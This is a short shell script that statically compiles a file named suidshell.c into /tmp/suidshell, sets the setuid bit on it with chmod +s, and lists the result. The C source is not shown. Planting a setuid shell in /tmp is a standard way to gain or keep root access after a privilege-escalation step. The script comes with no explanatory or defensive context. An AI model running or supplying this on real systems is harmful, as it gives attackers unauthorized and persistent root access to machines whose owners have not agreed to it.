#!/bin/sh

gcc -static suidshell.c -o /tmp/suidshell
chmod +s /tmp/suidshell
ls -l /tmp/suidshell
